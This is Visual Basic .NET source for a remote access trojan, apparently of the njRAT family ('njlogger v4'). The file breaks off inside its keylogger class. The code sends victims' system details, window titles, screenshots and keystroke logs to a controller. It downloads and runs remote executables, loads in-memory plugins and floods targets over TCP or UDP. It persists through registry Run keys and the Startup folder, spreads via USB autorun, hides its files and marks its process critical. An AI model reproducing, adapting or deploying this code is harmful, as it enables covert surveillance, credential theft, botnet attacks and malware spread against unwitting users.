Imports System.Text
Imports System.Threading
Imports System.IO
Imports Microsoft.Win32
Imports Microsoft.VisualBasic.Devices
Imports System.Net.Sockets
Imports System.Environment
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.IO.Compression
Imports System.Drawing.Imaging
Imports System.Net
Imports System.Drawing
Imports System.Windows.Forms
Imports System.Diagnostics
Imports System.Collections.Generic

Public Class OK
    Dim b As Byte() = New Byte(5121 - 1) {}
    Dim C As TcpClient = Nothing
    Dim Cn As Boolean = False
    Dim F As Computer = New Computer
    Dim FS As FileStream
    Dim lastcap As String = ""
    Dim LO As FileInfo = New FileInfo(Application.ExecutablePath)
    Dim MeM As MemoryStream = New MemoryStream
    Dim MT As Object = Nothing
    Dim H As String = ""
    Dim P As String = ""
    Dim kq As kl = Nothing
    Dim PLG As Object = Nothing
    Dim Cnon As Boolean = True
    Declare Ansi Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
    Declare Function NtsetInformationProcess Lib "ntdll" (ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    Declare Ansi Function GetForegroundWindow Lib "user32.dll" () As IntPtr
    Declare Ansi Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, ByVal nVolumeNamesize As Integer, ByRef lpVolumeserialTber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFilesystemCKs As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFilesystemNameBuffer As String, ByVal nFilesystemNamesize As Integer) As Integer
    Declare Ansi Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef WinTitle As String, ByVal MaxLength As Integer) As Integer
    Declare Ansi Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer

#Region "Settings"     
    Dim PH As String = "[PH]"
    Dim DR As String = "[DR]"
    Dim EXE As String = "[EXE]"
    Dim BD As Boolean = "[BD]"
    Dim Idr As Boolean = "[Idr]"
    Dim IsF As Boolean = "[Isf]"
    Dim Isu As Boolean = "[Isu]"
    Dim RG As String = "[RG]"
    Dim sf As String = "software\Microsoft\Windows\CurrentVersion\Run"
    Dim VN As String = "[VN]"
    Dim VR As String = "0.12G"
    Dim Y As String = "|'|'|"
    Dim klen As Integer = "[Klen]"
    Dim Hid As Boolean = "[Hid]"
    Dim Spr As Boolean = "[Spr]"
#End Region

    Shared Sub main()
        Dim x As New OK
        x.NCN()
    End Sub


    Sub Ncn()
        If Not GTV("hp", "") = "" Then PH = DEB(GTV("hp", RegistryValueKind.String))
        Dim Tcn As Integer = 0
        Try
            For Each x In Split(PH, ",")
                If Not x = "" Then
                    Dim i As New OK
                    If TCN = 0 Then
                        i.start(True, x)
                    Else
                        i.start(False, x)
                    End If
                End If
                TCN += 1
            Next
        Catch ex As Exception
            DLV("hp")
            Exit Sub
        End Try
        STV("hp", ENB(PH), RegistryValueKind.String)
    End Sub

    Sub start(ByVal c As Boolean, ByVal s As String)
        Try
            Dim A As String() = Split(s, ":")
            If Not A(0).Length = 0 And Not A(1).Length = 0 Then
                H = A(0)
                P = A(1)
                Cnon = c
                Dim TH As New Thread(New ThreadStart(AddressOf ko), 1)
                TH.Start()
            End If
        Catch ex As Exception
            DLV("hp")
        End Try
    End Sub

    Sub Ind(ByVal b As Byte())
        Dim A As String() = Split(BS(b), Y), by As Byte() = Nothing
        Try
            Select Case A(0)
                Case "lI"
                    Cn = False
                Case "kl"
                    Try
                        Send("kl" & Y & ENB(kq.Logs))
                    Catch ex As Exception
                        Send("kl" & Y & ENB(GTV("kl", "")))
                    End Try
                Case "prof"
                    Select Case A(1)
                        Case "~"
                            STV(A(2), A(3), RegistryValueKind.String)
                        Case "!"
                            STV(A(2), A(3), RegistryValueKind.String)
                            Send("getvalue" & Y & A(1) & Y & GTV(A(1), ""))
                        Case "@"
                            DLV(A(2))
                        Case "$"
                            Try
                                If A(3).Length > 0 Then If GTV("i", "") = "" Then Exit Select
                                Dim s As String = DEB(GTV("hp", ""))
                                If s.Length < 10 And s.Length = 0 Then s = DEB(PH)
                                If s.Contains(A(2)) = False Then
                                    For Each x In Split(A(2), ",")
                                        If Not x = String.Empty Then
                                            s = s.Replace(x & ",", "")
                                            Dim xx As New OK
                                            xx.start(False, x)
                                        End If
                                    Next
                                    If A(3).Length > 0 Then
                                        DLV("i")
                                    Else
                                        s += A(2)
                                        STV("hp", ENB(s), RegistryValueKind.String)
                                    End If
                                End If   
                            Catch ex As Exception
                                DLV("hp")
                            End Try
                    End Select

                Case "info"
                    by = GTV(A(1), New Byte(0 - 1) {})
                    If A(2).Length < 10 And by.Length = 0 Then
                        Send("pl" & Y & A(1) & Y & 1)
                    Else
                        If (A(2).Length > 10) Then
                            Dim M As New MemoryStream
                            Dim T As Integer = (A(0) & Y & A(1) & Y).Length
                            M.Write(b, T, (b.Length - T))
                            by = ZIP(M.ToArray)
                            STV(A(1), by, RegistryValueKind.Binary)
                        End If
                        Send("pl" & Y & A(1) & Y & 0)
                        Dim ob As Object = Plugin(by, "A")
                        Send("info" & Y & A(1) & Y & ENB(CType(ob.GT, String)))
                    End If

                Case "ret"
                    by = GTV(A(1), New Byte(0 - 1) {})
                    If A(2).Length < 10 And by.Length = 0 Then
                        Send("pl" & Y & A(1) & Y & 1)
                    Else
                        If (A(2).Length > 10) Then
                            Dim M As New MemoryStream
                            Dim T As Integer = (A(0) & Y & A(1) & Y).Length
                            M.Write(b, T, (b.Length - T))
                            by = ZIP(M.ToArray)
                            STV(A(1), by, RegistryValueKind.Binary)
                        End If
                        Send("pl" & Y & A(1) & Y & 0)
                        Dim ob As Object = Plugin(by, "A")
                        Send("ret" & Y & A(1) & Y & ENB(CType(ob.GT, String)))
                    End If

                Case "inv"
                    by = GTV(A(1), New Byte(0 - 1) {})
                    If A(3).Length < 10 And by.Length = 0 Then
                        Send("pl" & Y & A(1) & Y & 0)
                    Else
                        If (A(3).Length > 10) Then
                            Dim MM As New MemoryStream
                            Dim offset As Integer = (A(0) & Y & A(1) & Y & A(2) & Y).Length
                            MM.Write(b, offset, (b.Length - offset))
                            by = ZIP(MM.ToArray)
                            STV(A(1), by, RegistryValueKind.Binary)
                        End If
                        Send("pl" & Y & A(1) & Y & 0)
                        Dim ob As Object = Plugin(by, "A")
                        ob.h = H
                        ob.p = P
                        ob.osk = A(2)
                        ob.start()
                        Do Until Cn = False Or ob.Off = True
                            Threading.Thread.Sleep(1)
                        Loop
                        ob.off = True
                    End If

                Case "CAP"
                    Dim x As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                    Dim g = Graphics.FromImage(x)
                    g.CopyFromScreen(0, 0, 0, 0, New Size(x.Width, x.Height), CopyPixelOperation.SourceCopy)
                    Try
                        Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
                    Catch : End Try
                    g.Dispose()
                    Dim m As New IO.MemoryStream
                    b = SB("CAP" & Y)
                    m.Write(b, 0, b.Length)
                    Dim E As EncoderParameters = New EncoderParameters(1)
                    E.Param(0) = New EncoderParameter(Drawing.Imaging.Encoder.Quality, 50)
                    Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
                    Dim MM As New IO.MemoryStream
                    x.GetThumbnailImage(A(1), A(2), Nothing, Nothing).Save(MM, ici, E)
                    m.Write(MM.ToArray, 0, MM.Length)
                    Sendb(m.ToArray)
                    m.Dispose()
                    MM.Dispose()
                    x.Dispose()

                Case "un"
                    Select Case A(1)
                        Case "~"
                            UNS()
                        Case "!"
                            pr(0)

                            Process.GetProcessById(Process.GetCurrentProcess.Id).Kill()
                        Case "@"
                            pr(0)
                            Process.Start(LO.FullName)
                            Process.GetProcessById(Process.GetCurrentProcess.Id).Kill()
                    End Select


                Case "Ex"
                    If PLG Is Nothing Then
                        Send("PLG")
                        Dim T As Integer = 0
                        While Not PLG IsNot Nothing Or T = 20 Or Not Cn
                            T += 1
                            Thread.Sleep(1000)
                        End While
                        If PLG Is Nothing Or Not Cn Then
                            Return
                        End If
                    End If
                    PLG.ind(b)

                Case "PLG"
                    Dim M As New MemoryStream
                    Dim T As Integer = (A(0) & Y).Length
                    M.Write(b, T, (b.Length - T))
                    PLG = Plugin(ZIP(M.ToArray), "A")
                    PLG.H = H
                    PLG.P = P
                    PLG.c = C
                Case "up"
                    If A(1).Chars(0) = ChrW(31) Then
                        Try
                            Dim stream6 As New MemoryStream
                            Dim num4 As Integer = (A(0) & Y).Length
                            stream6.Write(b, num4, (b.Length - num4))
                            by = ZIP(stream6.ToArray)
                        Catch
                            Send(("MSG" & Y & "Update ERROR"))
                            Send("bla")
                            Return
                        End Try
                    Else
                        Dim wb As New WebClient
                        Try
                            by = wb.DownloadData(A(1))
                        Catch ex As Exception
                            Send(("MSG" & Y & "Update ERROR"))
                            Send("bla")
                            Return
                        End Try
                    End If
                    Send("bla")
                    Dim fileName As String = (IO.Path.GetTempFileName & ".exe")
                    Try
                        Send(("MSG" & Y & "Updating To " & New FileInfo(fileName).Name))
                        Thread.Sleep(&H7D0)
                        File.WriteAllBytes(fileName, by)
                        Process.Start(fileName, "..")
                    Catch ex As Exception
                        Send("MSG" & Y & "Update ERROR " & ex.Message)
                        Return
                    End Try
                    UNS()

                Case "rn"
                    If A(2).Chars(0) = ChrW(31) Then
                        Try
                            Dim m As New MemoryStream
                            Dim length As Integer = (A(0) & Y & A(1) & Y).Length
                            m.Write(b, length, (b.Length - length))
                            by = ZIP(m.ToArray)
                        Catch ex As Exception
                            Send("MSG" & Y & "Execute ERROR")
                            Send("bla")
                            Return
                        End Try
                    Else
                        Dim w As New WebClient
                        Try
                            by = w.DownloadData(A(2))
                        Catch ex As Exception
                            Send("MSG" & Y & "Download ERROR")
                            Send("bla")
                            Return
                        End Try
                    End If
                    Send("bla")
                    Dim path As String = (IO.Path.GetTempFileName & "." & A(1))
                    Try
                        File.WriteAllBytes(path, by)
                        Process.Start(path)
                        Send("MSG" & Y & "Executed As " & New FileInfo(path).Name)
                    Catch ex As Exception
                        Send("MSG" & Y & "Execute ERROR " & ex.Message)
                    End Try
                Case "fld"
                    If IsFlooding = False Then
                        Dim FIP As String = A(1)
                        Dim Fport As Integer = A(2)
                        Dim Protocol As String = A(3)
                        Dim threads As Integer = A(4)
                        Dim Delay As Integer = A(5)
                        Dim tm As Date
                        tm = DateTime.Now.AddSeconds(A(6))
                        Dim Resp As Boolean = A(7)
                        Dim Data As String = A(8)
                        Dim FloodCount As Integer = 0
                        IsFlooding = True
                        Try
                            Dim bytes As Byte() = Encoding.ASCII.GetBytes(Data)
                            Dim remoteEP As New IPEndPoint(IPAddress.Parse(FIP), Fport)
                            Do While IsFlooding
                                If Protocol = "TCP" Then
                                    Dim TCP As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp) With { _
                                        .Blocking = Resp _
                                    }
                                    TCP.Connect(remoteEP)
                                    Try
                                        Do While IsFlooding
                                            FloodCount += 1
                                            TCP.Send(bytes)
                                            If Delay > 0 Then
                                                Thread.Sleep(Delay)
                                            End If
                                            If DateTime.Now > tm Then
                                                IsFlooding = False
                                            End If
                                        Loop
                                        Continue Do
                                    Catch ex As Exception
                                        Continue Do
                                    End Try
                                End If

                                If Protocol = "UDP" Then
                                    Dim UDP As New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp) With { _
                                        .Blocking = Resp _
                                    }
                                    Try
                                        Do While IsFlooding
                                            FloodCount += 1
                                            UDP.SendTo(bytes, SocketFlags.None, remoteEP)
                                            If Delay > 0 Then
                                                Thread.Sleep(Delay)
                                            End If
                                            If DateTime.Now > tm Then
                                                IsFlooding = False
                                            End If
                                        Loop
                                        Continue Do
                                    Catch ex As Exception
                                        Continue Do
                                    End Try
                                End If
                                If DateTime.Now > tm Then
                                    IsFlooding = False
                                End If
                                If threads > 0 Then
                                    Thread.Sleep(threads)
                                End If
                            Loop
                            Send("MSG" & Y & "Attacked " & FIP & ":" & Fport & "   Requested " & FloodCount & " (" & Protocol & ")")
                        Catch ex As Exception
                            Send("MSG" & Y & "Attacking ERROR " & ex.Message)
                        End Try
                    End If
            End Select
        Catch ex As Exception
            Try
                If A.Length > 0 AndAlso A(0) = "Ex" Or A(0) = "PLG" Then
                    PLG = Nothing
                End If
                Send("ER" & Y & A(0) & Y & ex.Message)
            Catch : End Try
        End Try
    End Sub


    Public IsFlooding As Boolean = False

    Public Function GetEncoderInfo(ByVal M As String) As ImageCodecInfo
        Dim j As Integer
        Dim encoders As ImageCodecInfo()
        encoders = ImageCodecInfo.GetImageEncoders()
        For j = 0 To encoders.Length
            If encoders(j).MimeType = M Then
                Return encoders(j)
            End If
        Next j
        Return Nothing
    End Function
    Sub ko()
        If Cnon Then
            STV("i", "!", RegistryValueKind.String)
            If (Not Interaction.Command Is Nothing) Then
                Try
                    F.Registry.CurrentUser.SetValue("di", "!")
                Catch : End Try
                Thread.Sleep(5000)
            End If

            Dim createdNew As Boolean = False
            MT = New Mutex(True, RG & VN, createdNew)
            If Not createdNew Then
                Process.GetProcessById(Process.GetCurrentProcess.Id).Kill()
            End If

            INS()

            If Not Idr Then
                EXE = LO.Name
                DR = LO.Directory.Name
            End If

            Dim th As New Thread(New ThreadStart(AddressOf RC), 1)
            th.Start()

            kq = New kl
            kq.RG = RG
            kq.Klen = klen
            Dim kk As New Thread(New ThreadStart(AddressOf kq.WRK), 1)
            kk.Start()

            Dim ac As Integer
            Dim su As Integer
            Dim s As String = ""
            If BD Then
                Try
                    AddHandler SystemEvents.SessionEnding, New SessionEndingEventHandler(AddressOf ED)
                    pr(1)
                Catch : End Try
            End If

            Do While True
                Thread.Sleep(1000)
                If Not Cn Then
                    s = ""
                End If
                Application.DoEvents()
                ac += 1
                su += 1
                Try
                    If su = 5 Then
                        su = 0
                        Try
                            Process.GetCurrentProcess.MinWorkingSet = CType(1024, IntPtr)
                        Catch : End Try
                    End If
                    If ac = 8 Then
                        ac = 0
                        Dim ov As String = ACT()
                        If ov.Length > 0 Then
                            Send("act" & Y & ov)
                        End If
                        If Isu Then
                            Try
                                F.Registry.CurrentUser.OpenSubKey(sf, True).SetValue(RG, ("""" & LO.FullName & """ .."))
                            Catch : End Try
                            Try
                                F.Registry.LocalMachine.OpenSubKey(sf, True).SetValue(RG, ("""" & LO.FullName & """ .."))
                            Catch : End Try
                        End If
                        If Spr Then
                            USBspr(True)
                        End If
                        If Hid Then
                            Try
                                SetAttr(LO.FullName, FileAttribute.Hidden)
                            Catch : End Try

                            Try
                                SetAttr(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & RG & ".exe", FileAttributes.Hidden)
                            Catch : End Try

                            Try
                                F.Registry.SetValue("HKEY_CURRENT_USER\software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", "0", RegistryValueKind.DWord)
                            Catch : End Try

                        End If
                    End If
                Catch : End Try
            Loop
        Else
            Dim TH As New Thread(New ThreadStart(AddressOf RC), 1)
            TH.Start()
            Dim ac As Integer = 0
            Do While True
                Thread.Sleep(1000)
                Try
                    If ac = 8 Then
                        ac = 0
                        Dim ov As String = ACT()
                        If ov.Length > 0 Then
                            Send("act" & Y & ov)
                        End If
                    End If
                Catch : End Try
            Loop
        End If

    End Sub

    Sub USBspr(ByVal use As Boolean)
        Try
            If use Then
                Dim DriveList As String() = Environment.GetLogicalDrives()
                For i As Integer = 0 To DriveList.Length - 1
                    Dim di As New DriveInfo(DriveList(i))
                    If di.DriveType = DriveType.Removable Then
                        If Not di.IsReady = False Then
                            If Not File.Exists(DriveList(i) & RG & ".exe") Then
                                File.Copy(Application.ExecutablePath, DriveList(i) & RG & ".exe", True)
                                My.Computer.FileSystem.WriteAllText(DriveList(i) & "autorun.inf", "[autorun]" & vbCrLf & "open=" & DriveList(i) & RG & ".exe" & vbCrLf & "shellexecute=" & DriveList(i), True)
                                SetAttr(DriveList(i) & RG & ".exe", FileAttribute.Hidden)
                                SetAttr(DriveList(i) & "autorun.inf", FileAttribute.Hidden)
                            End If
                        End If
                    End If
                Next
            Else
                Dim DriveList As String() = Environment.GetLogicalDrives()
                For i As Integer = 0 To DriveList.Length - 1
                    Dim di As New DriveInfo(DriveList(i))
                    If di.DriveType = DriveType.Removable Then
                        If Not di.IsReady = False Then
                            If File.Exists(DriveList(i) & RG & ".exe") Then
                                SetAttr(DriveList(i) & RG & ".exe", FileAttribute.Normal)
                                SetAttr(DriveList(i) & "autorun.inf", FileAttribute.Normal)
                                IO.File.Delete(DriveList(i) & RG & ".exe")
                                IO.File.Delete(DriveList(i) & "autorun.inf")
                            End If
                        End If
                    End If
                Next
            End If
        Catch : End Try
     End Sub
 
    Function ACT() As String
        Dim s As String
        Try
            Dim foregroundWindow As IntPtr = GetForegroundWindow()
            If (foregroundWindow = IntPtr.Zero) Then
                Return ""
            End If
            Dim winTitle As String = Strings.Space((GetWindowTextLength(CLng(foregroundWindow)) + 1))
            GetWindowText(foregroundWindow, winTitle, winTitle.Length)
            s = ENB(winTitle)
        Catch
            s = ""
        End Try
        Return s
    End Function

    Function BS(ByRef B As Byte()) As String
        Return Encoding.UTF8.GetString(B)
    End Function

    Function Cam() As Boolean
        Try
            Dim T As Integer = 0
            Do
                If capGetDriverDescriptionA(CShort(T), Strings.Space(100), 100, Nothing, 100) Then
                    Return True
                End If
                T += 1
            Loop While (T <= 4)
        Catch
        End Try
        Return False
    End Function

    Function CompDir(ByVal F1 As FileInfo, ByVal F2 As FileInfo) As Boolean
        If (F1.Name.ToLower = F2.Name.ToLower) Then
            Dim directory As DirectoryInfo = F1.Directory
            Dim parent As DirectoryInfo = F2.Directory
            Do
                If (directory.Name.ToLower <> parent.Name.ToLower) Then
                    Return False
                End If
                directory = directory.Parent
                parent = parent.Parent
                If ((directory Is Nothing) And (parent Is Nothing)) Then
                    Return True
                End If
                If (directory Is Nothing) Then
                    Return False
                End If
            Loop While (Not parent Is Nothing)
        End If
        Return False
    End Function

    Function connect() As Boolean
        Cn = False
        Thread.Sleep(2000)
        Dim l As FileInfo = LO
        SyncLock l
            Try
                If (Not C Is Nothing) Then
                    Try
                        C.Close()
                        C = Nothing
                    Catch
                    End Try
                End If
                Try
                    MeM.Dispose()
                Catch
                End Try
            Catch
            End Try
            Try
                MeM = New MemoryStream
                C = New TcpClient
                C.ReceiveBufferSize = 204800
                C.SendBufferSize = 204800
                C.Client.SendTimeout = 10000
                C.Client.ReceiveTimeout = 10000
                C.Connect(H, P)
                Cn = True
                Send(inf())

                Try
                    Dim s As String = ""
                    If GTV("vn", "") = "" Then
                        s += DEB(VN) & ","
                    Else
                        s += DEB(GTV("vn", "")) & ","
                    End If
                    s += H & ":" & P & ","
                    s += DR & ","
                    s += EXE & ","
                    s += Idr & ","
                    s += IsF & ","
                    s += Isu & ","
                    s += BD & ","
                    s += Hid & ","
                    s += Spr & ","
                     Send("infn" & Y & ENB(s))
                Catch
                End Try
            Catch
                Cn = False
            End Try
        End SyncLock
        Return Cn
    End Function

    Function DEB(ByRef s As String) As String
        Return BS(Convert.FromBase64String(s))
    End Function

    Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(SB(s))
    End Function

    Function GTV(ByVal n As String, ByVal ret As Object) As Object
        Dim ob As Object
        Try
            ob = F.Registry.CurrentUser.OpenSubKey("software\" & RG).GetValue(n, ret)
        Catch
            ob = ret
        End Try
        Return ob
    End Function

    Function HWD() As String
        Dim s As String
        Try
            Dim T As Integer
            GetVolumeInformation(Environ("systemDrive") & "\", Nothing, 0, T, 0, 0, Nothing, 0)
            s = Conversion.Hex(T)
        Catch
            s = "ERR"
        End Try
        Return s
    End Function

    Sub DLV(ByVal n As String)
        Try
            Registry.CurrentUser.OpenSubKey("software\" & RG, True).DeleteValue(n)
        Catch : End Try
    End Sub

    Sub ED()
        pr(0)
    End Sub

    Function inf() As String
        Dim s As String = "li" & Y
        Try
            If GTV("vn", "") = "" Then
                s += ENB(DEB(VN) & "_" & HWD()) & Y
            Else
                s += ENB(DEB(GTV("vn", "")) & "_" & HWD()) & Y
            End If
        Catch ex As Exception
            s += ENB(HWD) & Y
        End Try
        Try
            s += ENB(Environment.MachineName) & Y
        Catch ex As Exception
            s += ENB("??") & Y
        End Try
        Try
            s += ENB(Environment.UserName) & Y
        Catch ex As Exception
            s += ENB("??") & Y
        End Try
        Try
            s += LO.LastWriteTime.Date.ToString("yy-MM-dd") & Y
        Catch ex As Exception
            s += "??-??-??" & Y
        End Try
        s += "" & Y
        Try
            s += F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("�", "").Replace("�", "").Replace("  ", " ").Replace(" Win", "Win")
        Catch ex As Exception
            s += "??"
        End Try
        s += "SP"
        Try
            Dim A As String() = Split(Environment.OSVersion.ServicePack, " ")
            If A.Length = 1 Then
                s += "0"
            End If
            s += A(A.Length - 1)
        Catch ex As Exception
            s += "0"
        End Try
        Try
            If Environment.GetFolderPath(SpecialFolder.ProgramFiles).Contains("x86") Then
                s += " x64" & Y
            Else
                s += " x86" & Y
            End If
        Catch ex As Exception
            s += Y
        End Try

        If Cam() Then
            s += "Yes" & Y
        Else
            s += "No" & Y
        End If

        s += VR & Y & ".." & Y & ACT() & Y

        Dim s0 As String = ""
        Try
            Dim s4 As String
            For Each s4 In F.Registry.CurrentUser.CreateSubKey("software\" & RG, RegistryKeyPermissionCheck.Default).GetValueNames
                If (s4.Length = 32) Then
                    s0 = (s0 & s4 & ",")
                End If
            Next
        Catch : End Try
        Return s & s0
    End Function
     
    Sub INS()
        Thread.Sleep(1000)
        If Idr AndAlso Not CompDir(LO, New FileInfo(Environ(DR).ToLower & "\" & EXE.ToLower)) Then      
            Try
                If File.Exists(Environ(DR) & "\" & EXE) Then
                    File.Delete(Environ(DR) & "\" & EXE)
                End If
                Dim M As New FileStream(Environ(DR) & "\" & EXE, FileMode.CreateNew)
                Dim A As Byte() = File.ReadAllBytes(LO.FullName)
                M.Write(A, 0, A.Length)
                M.Flush()
                M.Close()
                LO = New FileInfo(Interaction.Environ(DR) & "\" & EXE)
                Process.Start(LO.FullName)
                Process.GetProcessById(Process.GetCurrentProcess.Id).Kill()
            Catch ex As Exception
                Process.GetProcessById(Process.GetCurrentProcess.Id).Kill()
            End Try
        End If

        Try
            Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)
        Catch : End Try

        Try
            Shell("netsh firewall add allowedprogram """ & LO.FullName & """ """ & LO.Name & """ ENABLE", vbHide)
        Catch : End Try

        If Isu Then
            Try
                F.Registry.CurrentUser.OpenSubKey(sf, True).SetValue(RG, ("""" & LO.FullName & """ .."))
            Catch : End Try
            Try
                F.Registry.LocalMachine.OpenSubKey(sf, True).SetValue(RG, ("""" & LO.FullName & """ .."))
            Catch : End Try
        End If

        If IsF Then
            Try
                File.Copy(LO.FullName, Environment.GetFolderPath(SpecialFolder.Startup) & "\" & RG & ".exe", True)
                FS = New FileStream(Environment.GetFolderPath(SpecialFolder.Startup) & "\" & RG & ".exe", FileMode.Open)
            Catch : End Try
        End If

        If Spr Then
            USBspr(True)
        End If

        If Hid Then
            Try
                SetAttr(LO.FullName, FileAttribute.Hidden)
            Catch : End Try
            Try
                SetAttr(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & RG & ".exe", FileAttributes.Hidden)
            Catch : End Try
        End If
    End Sub

    Function md5(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim s As String = ""
        Dim T As Byte
        For Each T In B
            s += T.ToString("x2")
        Next
        Return s
    End Function

    Function Plugin(ByVal b As Byte(), ByVal c As String) As Object
        For Each x In Assembly.Load(b).GetModules
            Dim type As Type
            For Each type In x.GetTypes
                If type.FullName.EndsWith(("." & c)) Then
                    Return x.Assembly.CreateInstance(type.FullName)
                End If
            Next
        Next
        Return Nothing
    End Function

    Function SB(ByRef s As String) As Byte()
        Return Encoding.UTF8.GetBytes(s)
    End Function

    Sub pr(ByVal i As Integer)
        Try
            NtsetInformationProcess(Process.GetCurrentProcess.Handle, 29, i, 4)
        Catch
        End Try
    End Sub

    Sub RC()
re:
        lastcap = ""
        If Not C Is Nothing Then
            Dim T As Long = -1
            Dim T2 As Integer = 0
            Try
A:
                T2 += 1
                If T2 = 10 Then
                    T2 = 0
                    Thread.Sleep(1)
                End If
                If Not Cn Then
                    GoTo C
                End If
                If C.Available < 1 Then
                    C.Client.Poll(-1, SelectMode.SelectRead)
                End If
B:
                If C.Available > 0 Then
                    If T = -1 Then
                        Dim s As String = ""
                        Do While True
                            Dim charCode As Integer = C.GetStream.ReadByte
                            Select Case charCode
                                Case -1
                                    GoTo C
                                Case 0
                                    T = s
                                    s = ""
                                    If T = 0 Then
                                        Send("")
                                        T = -1
                                    End If
                                    If C.Available <= 0 Then
                                        GoTo A
                                    End If
                                    GoTo B
                            End Select
                            s += ChrW(charCode).ToString
                        Loop
                    End If
                    b = New Byte(C.Available + 1 - 1) {}
                    Dim T5 As Long = (T - MeM.Length)
                    If b.Length > T5 Then
                        b = New Byte(CInt(T5 - 1) + 1 - 1) {}
                    End If
                    Dim CNT As Integer = C.Client.Receive(b, 0, b.Length, SocketFlags.None)
                    MeM.Write(b, 0, CNT)
                    If MeM.Length = T Then
                        T = -1
                        Dim TH As New Thread(New ParameterizedThreadStart(AddressOf Ind), 1)
                        TH.Start(MeM.ToArray)
                        TH.Join(100)
                        MeM.Dispose()
                        MeM = New MemoryStream
                    End If
                    GoTo A
                End If
           Catch : End Try
        End If
C:
        Try
            If (Not PLG Is Nothing) Then
                PLG.clear()
                PLG = Nothing
            End If
        Catch
        End Try
        Cn = False
        If Not connect() Then
            GoTo C
        End If
        Cn = True
        GoTo re
    End Sub

    Function Send(ByVal s As String) As Boolean
        Return Sendb(SB(s))
    End Function

    Function Sendb(ByVal b As Byte()) As Boolean
        If Not Cn Then
            Return False
        End If
        Try
            Dim l As FileInfo = LO
            SyncLock l
                If Not Cn Then
                    Return False
                End If
                Dim M As New MemoryStream
                Dim T As Integer = b.Length
                Dim by As Byte() = SB(T & ChrW(0))
                M.Write(by, 0, by.Length)
                M.Write(b, 0, b.Length)
                C.Client.Send(M.ToArray, 0, CInt(M.Length), SocketFlags.None)
            End SyncLock
        Catch ex As Exception
            Try
                If Cn Then
                    Cn = False
                    C.Close()
                End If
            Catch : End Try
        End Try
        Return Cn
    End Function

    Function STV(ByVal n As String, ByVal t As Object, ByVal typ As RegistryValueKind) As Boolean
         Try
            F.Registry.CurrentUser.CreateSubKey("software\" & RG).SetValue(n, t, typ)
            Return True
        Catch
            Return False
        End Try
    End Function

    Sub UNS()
        pr(0)
        Isu = False

        If Spr Then
            USBspr(False)
        End If

        Try
            SetAttr(LO.FullName, FileAttribute.Normal)
        Catch : End Try

        Try
            SetAttr(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & RG & ".exe", FileAttributes.Normal)
        Catch : End Try

        Try
            F.Registry.CurrentUser.OpenSubKey(sf, True).DeleteValue(RG, False)
        Catch : End Try

        Try
            F.Registry.LocalMachine.OpenSubKey(sf, True).DeleteValue(RG, False)
        Catch : End Try

        Try
            Registry.CurrentUser.OpenSubKey("Software\", True).DeleteSubKeyTree(RG)
        Catch : End Try

        Try
            Shell("netsh firewall delete allowedprogram """ & LO.FullName & """", vbHide)
        Catch : End Try

        Try
            If Not FS Is Nothing Then
                FS.Dispose()
                File.Delete(Environment.GetFolderPath(SpecialFolder.Startup) & "\" & RG & ".exe")
            End If
        Catch : End Try

        Try
            F.Registry.CurrentUser.OpenSubKey("software", True).DeleteSubKey(RG, False)
        Catch : End Try

        Try
            Shell("cmd.exe /c ping 0 -n 2 & del """ & LO.FullName & """", vbHide)
        Catch : End Try

        Process.GetProcessById(Process.GetCurrentProcess.Id).Kill()
    End Sub

    Function ZIP(ByVal B As Byte()) As Byte()
        Dim MM As New MemoryStream(B)
        Dim stream As New GZipStream(MM, CompressionMode.Decompress)
        Dim BF As Byte() = New Byte(4 - 1) {}
        MM.Position = (MM.Length - 5)
        MM.Read(BF, 0, 4)
        Dim count As Integer = BitConverter.ToInt32(BF, 0)
        MM.Position = 0
        Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
        stream.Read(array, 0, count)
        stream.Dispose()
        MM.Dispose()
        Return array
    End Function

End Class
Public Class kl
    ' njlogger v4
#Region "API"
    <DllImport("user32.dll")> _
 Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As System.Text.StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger, _
  ByVal dwhkl As IntPtr) As Integer
    End Function
    <DllImport("user32.dll")> _
    Private Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
    End Function
    <DllImport("user32.dll")> _
    Private Shared Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
    End Function
    Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
